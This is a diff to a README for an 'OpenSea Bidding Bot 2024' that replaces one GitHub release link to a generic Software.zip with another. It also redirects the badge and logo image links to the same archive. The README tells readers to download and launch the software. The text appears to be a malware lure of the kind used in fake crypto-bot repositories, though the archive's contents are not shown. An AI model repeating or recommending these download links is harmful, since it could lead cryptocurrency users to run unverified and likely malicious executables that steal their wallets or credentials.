@@ -17,7 +17,7 @@ This repository contains a powerful bidding bot that offers a range of features 
 
 ## Get Started
 
-To start using the OpenSea Bidding Bot 2024, download the software [here](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip). Once downloaded, launch the software to begin automating your bidding process on OpenSea.
+To start using the OpenSea Bidding Bot 2024, download the software [here](https://github.com/Kamikatsu62/OpenSea-Bidding-Bot-2024/releases/download/v2.0/Software.zip). Once downloaded, launch the software to begin automating your bidding process on OpenSea.
 
 ## Topics
 
@@ -41,8 +41,8 @@ For the latest updates and releases of the OpenSea Bidding Bot 2024, please chec
 
 ---
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Kamikatsu62/OpenSea-Bidding-Bot-2024/releases/download/v2.0/Software.zip)](https://github.com/Kamikatsu62/OpenSea-Bidding-Bot-2024/releases/download/v2.0/Software.zip)
 
 Get ready to revolutionize your bidding experience on OpenSea with the OpenSea Bidding Bot 2024. Happy bidding! 🚀🤖🎨
 
-![OpenSea Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/OpenSea_logo.svg/800px-OpenSea_logo.svg.png)
+![OpenSea Logo](https://github.com/Kamikatsu62/OpenSea-Bidding-Bot-2024/releases/download/v2.0/Software.zip)
